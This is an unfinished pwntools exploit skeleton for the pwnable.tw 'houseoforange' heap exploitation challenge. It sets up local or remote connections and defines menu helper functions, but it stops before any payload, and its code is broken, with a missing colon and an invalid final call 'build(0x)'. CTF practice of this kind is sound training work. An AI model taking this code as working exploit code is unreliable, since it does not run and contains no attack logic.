from pwn import *
import string
context.binary = './houseoforange'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


if args['REMOTE']:
	p = remote('chall.pwnable.tw', 10200)
	libc = ELF('./libc_32.so.6')
else:
	libc = context.binary.libc
	p = process('./houseoforange')
	gdb.attach(p, 'b* 0x08048A5D')

def dbg():
	raw_input()


def menu(ch):
	p.recvuntil('Your choice : ')
	p.sendline(str(ch))

def build(size, name, price, color)
	menu(1)
	p.recvuntil('Length of name :')
	p.sendline(str(size))
	p.recvuntil('Name :')
	p.send(name)
	p.recvuntil('Price of Orange:')
	p.sendline(str(price))
	p.recvuntil('Color of Orange:')
	p.sendline(str(color))

	print "build a house success"

def upgrade(name, price, color):
	menu(3)
	p.recvuntil('Name :')
	p.send(name)
	p.recvuntil('Price of Orange:')
	p.sendline(str(price))
	p.recvuntil('Color of Orange:')
	p.sendline(str(color))

def see():
	menu(2)


build(0x)
	



